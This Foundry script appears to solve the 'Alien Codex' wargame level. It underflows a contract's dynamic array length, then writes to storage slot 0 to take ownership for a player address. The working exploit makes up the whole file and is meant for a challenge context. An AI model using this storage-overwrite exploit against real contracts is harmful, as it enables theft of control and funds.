pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Console.sol";
interface AlienCodex {
    function owner() external view returns (address);
    function contact() external returns (bool);
    function codex(uint256 index) external view returns (bytes32);

    function makeContact() external ;

    function record(bytes32 ) external ;

    function retract() external ;

    function revise(uint256 , bytes32 ) external ;
}
contract AlienCodexUnlocker is Script {
    function setUp() public {}

    function run() public {
        AlienCodex target = AlienCodex(0x3Da7beecCEee2b293c6fEd96672A8c746A51F71C);
        address player = 0x3715592F5fDA21e57f13604551f928e3b9e5E3F5;
        vm.startBroadcast();
        // first make contact.
        target.makeContact();
        uint256 length = uint256(vm.load(address(target), bytes32(uint256(1))));
        for (uint i = 0; i < length + 1; i++) {
            target.retract();
        }
        // that for loop caused it to overflow so now its uint256 max. 
        // but how do we get it to write at storage slot 0. 
        //  function revise(uint256 i, bytes32 _content) public contacted {
        // codex[i] = _content;
        // ok the way that dynamic arrays work is storage slot = hash(storage slot) + index. 
        // we know that length is uintmax, index is free controllable but we need to wrap. 
        // so to wrap its just index = uintmax - hash(length) + n.
        uint256 index;
        unchecked {
            index = 0 - uint256(keccak256(abi.encode(1)));
        }
        target.revise(index, bytes32(uint256(uint160(player))));
        vm.stopBroadcast();
        require(target.owner() == player, "Didnt set properly.");
    }
}